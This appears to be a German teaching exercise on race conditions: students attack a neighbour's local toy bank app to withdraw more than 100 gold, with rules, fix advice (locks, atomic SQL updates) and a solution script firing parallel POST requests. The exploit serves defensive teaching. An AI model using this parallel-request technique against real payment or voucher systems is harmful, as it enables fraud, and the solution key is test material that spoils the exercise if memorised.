# Challenge: Race Condition (Gold doppelt abheben)

Ziel dieser Übung: Zeigt, dass „erst prüfen, dann abbuchen" nicht reicht, wenn
mehrere Anfragen **gleichzeitig** ankommen. Ihr hebt von einem Konto mit
100 Gold mehr als 100 Gold ab.

**Aufbau:** Jede:r startet die App auf dem **eigenen** Rechner; der/die
**Nachbar:in** greift diese Instanz an.

> ```powershell
> $env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5008
> ```

---

## Spielregeln

- Nur die eingeladene Instanz. Kein DoS: **höchstens ~20 parallele Requests**.
- Nur während des Übungstermins. Lösungsweg kurz dokumentieren.

---

## Szenario

Die Goldbank gibt jedem Besucher ein Konto mit **100 Gold**. Am Schalter kann
man abheben — das Gold wandert in die Satteltasche. Die Bank prüft brav, ob
genug auf dem Konto liegt. Die Buchung dauert aber einen Moment …

## Aufgabe

Bring **mehr als 100 Gold** in deine Satteltasche.

## Hinweise

- Zwei Klicks hintereinander reichen nicht — der zweite kommt zu spät.
- Dein Konto hängt am Cookie `spieler`. Alle Anfragen müssen ihn mitschicken.
- Python-Threads (`threading` oder `concurrent.futures`) + `requests` schicken
  mehrere POSTs auf `/abheben` praktisch gleichzeitig.

## Erfolgskriterium

- Die Startseite zeigt „Angriff geglückt" mit Satteltasche > 100.

## Zählt **nicht** als Lösung

- Negative Beträge o. ä. (werden abgelehnt), mehrere Konten zusammenlegen.

---

## Verteidigung / Fix

- **Ursache:** Check und Abbuchung sind nicht **atomar** (Time-of-Check vs.
  Time-of-Use).
- **Fix:** Kritischen Abschnitt sperren (`threading.Lock()` pro Konto), bzw. in
  der Datenbank atomar buchen:
  `UPDATE konten SET gold = gold - ? WHERE id = ? AND gold >= ?` und die Anzahl
  geänderter Zeilen prüfen. Transaktionen / `SELECT … FOR UPDATE`.
- Gleiches Muster bei Gutscheinen, „einmal pro Nutzer"-Aktionen, Likes, …

<details>
<summary>Lösungsweg (für Lehrende / nach der Übung)</summary>

```python
import requests
from concurrent.futures import ThreadPoolExecutor

ZIEL = "http://127.0.0.1:5008"
s = requests.Session()
s.get(ZIEL + "/")                      # Konto + Cookie anlegen

def hebe_ab(_):
    return s.post(ZIEL + "/abheben", data={"betrag": 100},
                  allow_redirects=False).status_code

with ThreadPoolExecutor(10) as pool:
    print(list(pool.map(hebe_ab, range(10))))   # mehrere 302 statt nur einem

print(s.get(ZIEL + "/").text.count("Angriff geglueckt"))
```
</details>
